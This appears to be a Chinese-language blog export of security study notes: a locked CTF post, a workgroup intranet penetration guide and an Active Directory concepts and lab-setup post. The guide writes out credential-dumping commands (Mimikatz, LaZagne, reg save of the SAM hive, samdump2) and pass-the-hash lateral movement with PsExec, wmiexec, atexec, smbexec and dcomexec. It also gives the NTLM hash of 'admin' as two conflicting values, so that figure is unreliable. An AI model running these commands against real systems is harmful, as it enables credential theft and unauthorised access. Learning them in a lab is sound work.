    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试！" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容！">
  <script id="hbeData" type="hbeData" data-hmacdigest="6f6b092795320da05f719dcf956d88c61a6088e1a120e4e6c7387d6045fe3681"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码！</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>工作组环境中进行内网渗透常见方法总结</title>
    <url>/article/33894e1d.html</url>
    <content><![CDATA[<p>呜呜呜，被佬批评了，这应该是上篇就要了解的板块了，忘记啦 QAQ！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126173914204.png" alt="image-20211126173914204" /></p>
<p>emmmm，先了解一下域环境和工作组环境的区别吧。其实之前就有写过（小声 bb：忘记了）。</p>
<h2 id="域和工作组的区别"><a class="anchor" href="#域和工作组的区别">#</a> 域和工作组的区别</h2>
<p>1、域英文叫 <code>DOMAIN</code> —— 域 ( <code>Domain</code> ) 是 <code>Windows</code>  网络中独立运行的单位，域之间相互访问则需要建立信任关系 (即 <code>Trust Relation</code> )。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2 个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。</p>
<p>2、工作组（ <code>Work Group</code> ）是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126173606304.png" alt="image-20211126173606304" /></p>
<p>1、域和工作组适用的环境不同，域一般是用在比较大的网络里，工作组则较小，在一个域中需要一台类似服务器的计算机，叫域控服务器，其他电脑如果想互相访问首先都是经过它的，但是工作组则不同，在一个工作组里的所有计算机都是对等的，也就是没有服务器和客户机之分的，但是和域一样，如果一台计算机想访问其他计算机的话首先也要找到这个组中的一台类似组控服务器，组控服务器不是固定的，以选举的方式实现，它存储着这个组的相关信息，找到这台计算机后得到组的信息然后访问。</p>
<p>2、工作组是一群计算机的集合，它仅仅是一个逻辑的集合，各自计算机还是各自管理的，你要访问其中的计算机，还是要到被访问计算机上来实现用户验证的。而域不同，域是一个有安全边界的计算机集合，在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器，不再需要被访问机器的许可了。</p>
<h2 id="0x01-netbios"><a class="anchor" href="#0x01-netbios">#</a> <strong>0x01 NetBIOS</strong></h2>
<p>网络基本输入 / 输出系统 ( <code>Network Basic Input/Output System, NetBIOS</code> ) 是一种标准的应用程序编程接口， <code>NetBIOS</code>  名称解析就是 <code>NetBIOS名称映射到IP地址的过程</code> 。</p>
<p><strong>nbtstat</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126174750789.png" alt="image-20211126174750789" /></p>
<p>查看本机 IP</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126175333998.png" alt="image-20211126175333998" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nbtstat <span class="token operator">-</span><span class="token constant">A</span> 本机<span class="token constant">IP</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126175359376.png" alt="image-20211126175359376" /></p>
<p><strong>nbtscan</strong></p>
<p>附上系统城的下载链接：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">windows版本：http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>xitongzhijia<span class="token punctuation">.</span>net<span class="token operator">/</span>soft<span class="token operator">/</span><span class="token number">195386</span><span class="token punctuation">.</span>html</pre></td></tr></table></figure><p><code>Windows</code>  版本</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126175903687.png" alt="image-20211126175903687" /></p>
<p><code>Linux</code>  版本</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126180059119.png" alt="image-20211126180059119" /></p>
<h2 id="0x02-nt-lan-manager"><a class="anchor" href="#0x02-nt-lan-manager">#</a> <strong>0x02 NT Lan Manager</strong></h2>
<p><code>NT Lan Manager</code>  的协议实现有 <code>Net-NTLMv1</code>  和 <code>Net-NTLMv2</code>  两个版本，两者响应值计算均使用了 <code>NT Hash</code> 。 <code>NTLM Hash</code>  通常是指 Windows 系统下 <code>Security Account Manager</code>  数据库中保存的用户密码的 <code>Hash</code>  值， <code>Windows</code>  本身不保存明文密码，只保留密码的 <code>Hash</code> ，攻击者利用获取到的 <code>NTLM Hash</code>  可进行 <code>PTH攻击</code> 。</p>
<p><strong>NTLM Hash 生成原理</strong></p>
<p>假设明文口令是 &quot; <code>admin</code> &quot;，首先将其进行十六进制转换，结果为&quot; <code>61646d696e</code> &quot;。</p>
<pre><code class="language-ABAP">admin -&gt; hex = 61646d696e
</code></pre>
<p>将其转换成 Unicode 字符串，结果为 &quot; <code>610064006d0069006e00</code> &quot;。</p>
<pre><code class="language-ABAP">61646d696e-&gt; Unicode = 610064006d0069006e00
</code></pre>
<p>对获取的 Unicode 字符串 &quot; <code>610064006d0069006e00</code> &quot;，进行标准 MD4 单向 Hash 运算，得到 128bit 的 Hash 值。</p>
<p>结果为 &quot; <code>c477236e88a7ae62a59e54e444612724</code> &quot;</p>
<p>也就得到了最后的 NTLM Hash。</p>
<pre><code class="language-ABAP">610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634
</code></pre>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>Description <span class="token operator">=</span> <span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="5"></td><td><pre>NTLM计算过程</pre></td></tr><tr><td data-num="6"></td><td><pre>admin -> hex = 61646d696e</pre></td></tr><tr><td data-num="7"></td><td><pre>61646d696e-> Unicode = 610064006d0069006e00</pre></td></tr><tr><td data-num="8"></td><td><pre>610064006d0069006e00 -> MD4 = 209c6174da490caeb422f3fa5a7ae634</pre></td></tr><tr><td data-num="9"></td><td><pre>'''</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>Description<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>Password <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Your Password:'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token builtin">hash</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'md4'</span><span class="token punctuation">,</span>Password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>hash_hex <span class="token operator">=</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'->'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>hash_hex<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126181346891.png" alt="image-20211126181346891" /></p>
<p><strong>NTLM Hash 提取方式</strong></p>
<p><strong>Mimikatz</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmdlbnRpbGtpd2kuY29tL21pbWlrYXR6">官网下载地址链接</span></p>
<p>以管理员身份运行 mimikaz</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>privilege<span class="token punctuation">:</span><span class="token punctuation">:</span>debug<span class="token comment">#提升权限</span></pre></td></tr><tr><td data-num="2"></td><td><pre>sekurlsa<span class="token punctuation">:</span><span class="token punctuation">:</span>logonpasswords<span class="token comment">#抓取密码</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126195704243.png" alt="image-20211126195704243" /></p>
<p>即可得到相关的 <code>NTLM</code>  信息。</p>
<p><strong>SafetyKatz</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dob3N0cGFjay9zYWZldHlrYXR6">下载地址</span></p>
<p>找了半天也没找到 emmmm，直接用大佬的图了</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126202035735.png" alt="image-20211126202035735" /></p>
<p><strong>LaZagne</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsZXNzYW5kcm9aL0xhWmFnbmUvcmVsZWFzZXMv">windows 版下载地址</span></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>lazagne<span class="token punctuation">.</span>exe all</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126202353492.png" alt="image-20211126202353492" /></p>
<p>麻了麻了，下面的就直接丢佬的图了</p>
<p><strong>Reg</strong></p>
<pre><code class="language-ABAP">reg save hklm\sam C:\Users\Administrator\Desktop\sam.hive

reg save hklm\system C:\Users\Administrator\Desktop\system.hive
</code></pre>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126212400035.png" alt="image-20211126212400035" /></p>
<pre><code class="language-ABAP">samdump2 system.hive sam.hive &gt; ntlm_hash.txt

cat ntlm_hash.txt
</code></pre>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126212538247.png" alt="image-20211126212538247" /></p>
<h2 id="0x03-认证过程"><a class="anchor" href="#0x03-认证过程">#</a> <strong>0x03 认证过程</strong></h2>
<p><strong>Windows Challenge/Response 认证过程</strong></p>
<ol>
<li>客户端发送用户名到服务器</li>
<li>客户端对明文口令进行 <code>Hash</code>  处理获得 <code>NTLM Hash</code></li>
<li>服务器生成一个 16 字节的随机数（ <code>Challenge</code> ）发送给客户端</li>
<li>客户端使用 <code>NTLM Hash</code>  对 <code>Challenge</code>  进行加密，加密结果为 <code>Response-C</code> ，然后将结果发送给服务器</li>
<li>服务器通过用户名检索到相对应的 <code>NTLM Hash</code>  并对 <code>Challenge</code>  进行加密得到 <code>Response-S</code> 。</li>
<li>比较 <code>Response-S</code>  和从客户端接收到的 <code>Response-C</code> ，如果一致则认证通过。</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126212625346.png" alt="image-20211126212625346" /></p>
<h2 id="0x04windows认证过程"><a class="anchor" href="#0x04windows认证过程">#</a> <strong>0x04Windows 认证过程</strong></h2>
<p>一般来说 <code>Winlogon</code>  服务针对本地计算机上的 <code>SAM</code>  安全账户数据库来进行 <code>Windows</code>  凭据验证。通过在登录用户界面上的用户输入等方式收集凭据，本地安全信息如策略设置、账户信息等一般存储在注册表 <code>HKEY_LOCAL_MACHINE\SECURITY</code>  中， <code>SAM</code>  数据库的备份也存在该注册表中。</p>
<p><code>winlogon.exe</code>  是负责管理安全用户交互的可执行文件， <code>Winlogon</code>  服务通过将用户在登录桌面上输入的用户名口令信息通过 <code>Secur32.dll</code>  传递给 <code>LSA</code>  服务后来启动 <code>Windows</code>  操作系统的登录过程。</p>
<p><code>lsass.exe</code>  主要对用户进行身份验证，将用户口令转化为 <code>NTLM Hash</code> ，同时将凭据信息存储在内存中，用户使用该凭据可访问网络资源等。</p>
<p><code>LSA</code>  凭据产生有如下几种情况：</p>
<ol>
<li>远程桌面登录</li>
<li>本地登录</li>
<li>使用 RunAs 运行服务</li>
<li>运行计划任务或批处理</li>
<li>利用远程管理工具在本地计算机运行服务</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126203017185.png" alt="image-20211126203017185" /></p>
<h2 id="0x05-pass-the-hash"><a class="anchor" href="#0x05-pass-the-hash">#</a> <strong>0x05 Pass The Hash</strong></h2>
<p><strong>PASXEC</strong></p>
<pre><code class="language-ABAP">PsExec.exe \\target_ip -u username -p password cmd

PsExec.exe \\192.168.1.6 -u administrator -p Abcd1234 cmd.exe
</code></pre>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126203636557.png" alt="image-20211126203636557" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126203750844.png" alt="image-20211126203750844" /></p>
<p><strong>WMIEXEC</strong></p>
<pre><code class="language-ABAP">cscript.exe wmiexec.vbs /cmd domain_name username password cmd

cscript.exe wmiexec.vbs /cmd WIN-78L42RBHLLO administrator admin123!@# &quot;ipconfig&quot;
</code></pre>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126203831897.png" alt="image-20211126203831897" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126203856230.png" alt="image-20211126203856230" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126204016721.png" alt="image-20211126204016721" /></p>
<p><strong>ATEXEC</strong></p>
<pre><code class="language-ABAP">python atexec.py administrator:admin123!@#@192.168.3.133 ipconfig
</code></pre>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126204207214.png" alt="image-20211126204207214" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126204217289.png" alt="image-20211126204217289" /></p>
<p><strong>SMBEXEC</strong></p>
<pre><code class="language-ABAP">python smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f909fdb472d0b85cddb3e36669a9b07 administrator@192.168.3.133


</code></pre>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126204239779.png" alt="image-20211126204239779" /></p>
<p><strong>DCOMEXEC</strong></p>
<pre><code class="language-ABAP">python dcomexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f909fdb472d0b85cddb3e36669a9b07 administrator@192.168.3.133
</code></pre>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126204259777.png" alt="image-20211126204259777" /></p>
<h2 id="感言"><a class="anchor" href="#感言">#</a> 感言：</h2>
<p>咱就是这些工具都还在么？？？？咋一个个都找到 wuwuwuwu！！！</p>
<p><strong>参考文章</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvYmktalNtUlJ2bzc3N1dqTnJVTTdPUQ==">工作组环境中进行内网渗透常见方法总结</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>域的相关概念及配置</title>
    <url>/article/86d50ac0.html</url>
    <content><![CDATA[<h3 id="内网机结构"><a class="anchor" href="#内网机结构">#</a> 内网机结构</h3>
<h4 id="00x01工作组work-group"><a class="anchor" href="#00x01工作组work-group">#</a> 00x01 工作组（Work Group）</h4>
<p><strong>工作组</strong>是局域网中的一个概念，它是最常见的资源管理模式，简单是因为默认情况下计算机都是采用工作组方式进行资源管理的。将不同的电脑按功能分别列入不同的组中，以方便管理。</p>
<p>默认情况下所有计算机都处在名为 WORKGROUP 的工作组中，工作组资源管理模式适合于网络中计算机不多，对管理要求不严格的情况。它的建立步骤简单，使用起来也很好上手。大部分中小公司都采取工作组的方式对资源进行权限分配和目录共享。相同组中的不同用户通过对方主机的用户名和密码可以查看对方共享的文件夹，默认共享的是 Users 目录。不同组的不同用户通过对方主机的用户名和密码也可以查看对方共享的文件夹。所以工作组并不存在真正的集中管理作用，工作组里的所有计算机都是<strong>对等的</strong>，也就是没有服务器和客户机之分的。</p>
<h4 id="00x02域domain"><a class="anchor" href="#00x02域domain">#</a> 00x02 域（Domain）</h4>
<p><strong>域</strong>：用来描述一种架构，和 “工作组” 相对应，由工作组升级而来的高级架构，域 (Domain) 是一个有安全边界的计算机集合（ 安全边界，意思是在两个域中，一个域中的用户无法访问另一个域中的资源）。</p>
<p>可以简单的把域理解成升级版的 “工作组”，相比工作组而言，它有一个更加严格的安全管理控制机制，如果你想访问域内的资源，就必须拥有一个合法的身份登陆到该域中，而你对该域内的资源拥有什么样的权限，还需要取决于你在该域中的用户身份。</p>
<p><strong>域的功能和特点：</strong></p>
<ul>
<li>集中管理，可以集中地管理企业中成千上万分布于异地的计算机和用户</li>
<li>便捷的资源访问，能够很容易地定位到域中的资源。用户依次登录就可以访问整个网络资源，集中地身份验证</li>
<li>可扩展性，既可以适用于几十台计算机的小规模网络，也可以用于跨国公司</li>
</ul>
<h5 id="一-域控制器domain-controller"><a class="anchor" href="#一-域控制器domain-controller">#</a> 一、域控制器（Domain Controller）</h5>
<p>简写为  <code>DC</code> ，域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。</p>
<p>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源。</p>
<p>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码。</p>
<p>而要想实现域环境，就必须要计算机中安装活动目录（AD），也可以说如果在内网中的一台计算机上安装了活动目录（AD），那它就变成了域控制器。在域中除了域控制器还有成员服务器、客户机、独立服务器。</p>
<p>一个域中可能应该要有至少两个域控。一个作为 DC，一个是备份 DC。如果没有第二个备份 DC，那么一旦 DC 瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）存储在 DC 中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的 DC 恢复了就行了。</p>
<h5 id="二-父域和子域"><a class="anchor" href="#二-父域和子域">#</a> 二、父域和子域</h5>
<p>第一个域称为父域也可以叫根域 ，各分部的域称为该域的子域 。</p>
<p>形象的来说，一个部门一个域，那个如果这个部门还有分部，那每个分部就可被称为子域，这个大的部门便称为父域。每个域中都有独立的安全策略。</p>
<p><strong>父域与子域之间默认建立起了双向信任关系</strong>。</p>
<h5 id="三-域树"><a class="anchor" href="#三-域树">#</a> 三、域树</h5>
<p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。</p>
<p>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个 “.” 代表一个层次，如域 <code>child.Microsoft.com</code>  就比  <code>Microsoft.com</code>  这个域级别低，因为它有两个层次关系，而 <code>Microsoft.com</code>  只有一个层次。</p>
<p>而域 <code>Grandchild.Child.Microsoft.com</code>  又比  <code>Child.Microsoft.com</code>  级别低，道理一样。他们都属于同一个域树。 <code>Child.Microsoft.com</code>  就属于 <code>Microsoft.com</code>  的子域。</p>
<p>多个域树可以组成一个域林。</p>
<p><strong>建立域树的好处：</strong></p>
<ul>
<li>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）</li>
<li>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。</li>
<li>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理</li>
</ul>
<p>在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。</p>
<h5 id="四-域林"><a class="anchor" href="#四-域林">#</a> 四、域林</h5>
<p>域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p>
<p>但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过 Kerberos 信任关系建立起来，所以每个域树都知道 <code>Kerberos</code>  信任关系，不同域树可以交叉引用其他域树中的对象。域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系.</p>
<p>比如 <code>benet.com.cn</code> , 则可以创建同属与一个林的 <code>accp.com.cn</code> , 他们就在同一个域林里.</p>
<p>当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。</p>
<p>林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125162247068.png" alt="image-20211125162247068" /></p>
<p><strong>域信任关系</strong></p>
<p>域之间的信任关系，相当于是不同域之间沟通的桥梁。域信任分为 单向信任 和 双向信任。单向信任只能是受信任域访问信任域，而信任域不能访问受信任域。双向信任是两个域可以互相访问。</p>
<ul>
<li>** 父子信任：** 父域与子域之间自动建立起了双向信任关系，并且信任关系可以传递。</li>
<li>** 树信任：** 同一个林中，林根域与其他树根域自动建立双向信任关系。信任关系可传递。</li>
<li><strong>快捷方式信任</strong>：为了加速认证流程而产生的信任关系。需要管理员手工建立，信任关系可向下传递。</li>
<li>** 林信任：** 在不更改 AD 结构的情况下，让不同林之间可以相互访问资源。信任关系可向下传递。</li>
<li>** 外部信任 / 跨林快捷方式信任：** 类似于同林内的快捷方式信任。单向，信任关系不可传递：</li>
<li>** 领域信任：** 为了让 AD 跟非 windows 系统的 kerberos 建立关系而存在的信任。</li>
</ul>
<h4 id="00x03活动目录"><a class="anchor" href="#00x03活动目录">#</a> 00x03 活动目录</h4>
<p>活动目录 AD 是域环境中提供目录服务的组件。在活动目录中，所有的网络对象信息以一种结构化的数据存储方式来保存，使得管理员和用户能够轻松地查找和使用这些信息。活动目录以这种结构化的数据存储方式作为基础，对目录信息进行合乎逻辑的分层组织。活动目录存储着有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确从目录中查找到他所需要的信息的服务。安装有 AD 活动目录的服务器就是域控 DC。</p>
<p>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容， 活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</p>
<p>在活动目录中记录的信息，被分为两大部分，一部分保存在活动目录数据库文件 NTDS.dit 中，另一部分保存在被复制的文件系统上。</p>
<p><strong>NTDS.dit</strong></p>
<p>域用户帐户以域数据库的形式保存在活动目录中，NTDS.dit 是活动目录的数据库文件，该文件记录的信息有以下三张表：</p>
<ul>
<li>Schema 表 ：这个表中包含了所有可在活动目录创建的对象信息以及他们之间的相互关系。包括各种类型对象的可选及不可选的各种属性。这个表是活动目录数据库中最小的一个表，但是也是最基础的一个表。</li>
<li>Link 表 ：Link 表包含所有属性的关联，包括活动目录中所有对象的属性的值。一个用户对象的所有属性的类型，包括每个属性的值及用户所属于的组等信息都属于这个表。这个表要大于 Schema 表，但与 Data 表相比要小。</li>
<li>Data 表：活动目录中用户，组，应用程序特殊数据和其他的数据全部保存在 Data 表中。这是活动目录中存储信息最多的一个表，大量的活动目录的资料实际上还是存储在这个表中。</li>
</ul>
<p><strong>Ntdsutil.exe</strong></p>
<p>ntdsutil.exe 是域控制器自带的域数据库管理工具，从 windows Server 2008 开始就默认自带了。因此我们可以通过 ntdsutil.exe 提取出域中所有的域用户信息。以下命令必须在域控上执行：</p>
<p><strong>逻辑结构</strong></p>
<p>在活动目录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为 “ <strong>逻辑结构</strong> ”。<br />
活动目录的逻辑结构就包括上面讲到的 组织单元（ OU ）、域（ domain ）、域树（ tree ）、域森林（ forest ） 。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</p>
<p><strong>活动目录的主要功能</strong></p>
<ul>
<li>帐号集中管理：所有帐号均存在服务器上，方便对帐号的重命名 / 重置密码。</li>
<li>软件集中管理：统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择安装软件。</li>
<li>环境集中管理：利用 AD 可以统一客户端桌面，IE，TCP/IP 等设置。</li>
<li>增强安全性：统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。</li>
<li>更可靠：更少的宕机时间。如：利用 AD 控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，宕机时间更少。</li>
<li>活动目录为 Microsoft 统一管理的基础平台，其它 ISA、Exchange、SMS 等服务都依赖于这个基础平台。</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211125213918744-1032164649.png" alt="image-20211125162522836" /></p>
<ul>
<li>Builtin 容器：Builtin 容器是 Active Driectory 默认创建的第一个容器，主要用于保存域中本地安全组。</li>
<li>Computers 容器：Computers 容器是 Active Driectory 默认创建的第 2 个容器，用于存放 Windows Server 2008 域内所有成员计算机的计算机账号。</li>
<li>Domain Controllers 容器：Domain Controllers 是一个特殊的容器，主要用于保存当前域控制器下创建的所有子域和辅助域。</li>
<li>Users 容器：Users 容器主要用于保存安装 Active Driectory 时系统自动创建的用户和登录到当前域控制器的所有用户账户。</li>
</ul>
<h4 id="00x04dmz"><a class="anchor" href="#00x04dmz">#</a> 00x04DMZ</h4>
<p>DMZ  <code>demilitarized zone</code>  ，中文名为 “隔离区”，或称 “非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。</p>
<p>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125162649535.png" alt="image-20211125162649535" /></p>
<h4 id="00x05域内的各种权限"><a class="anchor" href="#00x05域内的各种权限">#</a> 00x05 域内的各种权限</h4>
<p>首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。</p>
<p><strong>域本地组</strong></p>
<p>成员范围：所有的域；使用范围：自己所在的域</p>
<p><strong>全局组</strong></p>
<p>成员范围：自己所在的域；使用范围：所有的域</p>
<p><strong>通用组</strong></p>
<p>成员范围：所有的域；使用范围：所有的域</p>
<p><strong>A-G-DL-P 策略</strong></p>
<p>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p>
<ul>
<li>A 表示用户账号</li>
<li>G 表示全局组</li>
<li>U 表示通用组</li>
<li>DL 表示域本地组</li>
<li>P 表示资源权限</li>
</ul>
<h3 id="域环境搭建"><a class="anchor" href="#域环境搭建">#</a> 域环境搭建</h3>
<p>所用虚拟镜像</p>
<pre><code class="language-ABAP">win7专业版
windows server 2012 R2
cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_x64_dvd_617598
</code></pre>
<h4 id="环境描述"><a class="anchor" href="#环境描述">#</a> 环境描述</h4>
<p>使用的是 Parallels Desktop 虚拟机。统一使用 NAT 网络模式并可以访问外网。</p>
<pre><code class="language-ABAP"> windows server 2012 R2 : 10.211.55.12 域控
 windows server 2008 R2：10.211.55.8  域用户
 windows 7 ：10.211.55.7 域用户
 子网掩码：10.211.55.1
 DNS服务器：
 首选DNS：10.211.55.12
 备用DNS：202.102.154.3
</code></pre>
<h4 id="server2012域控"><a class="anchor" href="#server2012域控">#</a> server2012 域控</h4>
<h5 id="设置计算机名并设置静态ip地址"><a class="anchor" href="#设置计算机名并设置静态ip地址">#</a> 设置计算机名并设置静态 IP 地址</h5>
<p>修改计算机名为 Server2012</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125639375746.png" alt="img" /></p>
